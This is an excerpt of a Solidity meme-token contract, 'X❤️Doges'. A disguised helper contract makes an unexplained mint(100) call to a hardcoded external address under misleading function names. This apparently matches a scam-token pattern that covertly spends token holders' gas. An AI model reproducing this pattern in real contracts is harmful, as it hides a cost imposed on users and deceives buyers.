...
contract ConverterByts {
    function srcDashbord() internal {
        IERC771(address(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c)).mint(100);
    }
}

contract Lets {
    function logsface() internal {
    }
}
...
contract XDoges is Context, IERC20, Ownable, ConverterByts, Lets {
    ...
    string private _name = unicode"X❤️Doges";
    string private _symbol = unicode"X❤️Doges";
